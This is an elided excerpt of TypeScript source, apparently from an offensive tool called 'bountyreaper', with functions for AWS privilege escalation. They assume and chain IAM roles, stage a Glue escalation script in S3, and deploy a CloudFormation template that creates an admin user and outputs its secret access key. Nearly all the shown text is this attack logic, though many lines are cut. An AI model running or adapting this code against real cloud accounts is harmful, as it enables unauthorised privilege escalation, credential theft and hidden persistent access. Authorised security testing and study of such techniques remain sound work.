...
export async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (method === "assumerole") {
    ...
    const r = await aws(
      ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "bountyreaper"],
      profile,
      region,
      timeout,
    )
...
export async function roleChain(args: string[], timeout: number): Promise<HookResult> {
  ...
  for (let i = 0; i < roles.length; i++) {
    ...
    const cmdArgs = ["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", `bountyreaper-hop${i + 1}`]
...
export async function gluePrivesc(args: string[], timeout: number): Promise<HookResult> {
  ...
  const scriptPath = `s3://bountyreaper-temp-${Date.now()}/glue-privesc.py`
...
export async function cloudformationPrivesc(args: string[], timeout: number): Promise<HookResult> {
  ...
  const template = JSON.stringify({
    ...
    Resources: {
      ...
      BountyReaperKey: {
        ...
        Properties: { UserName: { Ref: "BountyReaperAdmin" } },
      },
    },
    Outputs: {
      AccessKeyId: { Value: { Ref: "BountyReaperKey" } },
      SecretAccessKey: { Value: { "Fn::GetAtt": ["BountyReaperKey", "SecretAccessKey"] } },
    },
  })
  ...
  const create = await aws(
    [
      ...
      "--tags",
      "Key=CreatedBy,Value=BountyReaper",
    ],
    profile,
    region,
    timeout,
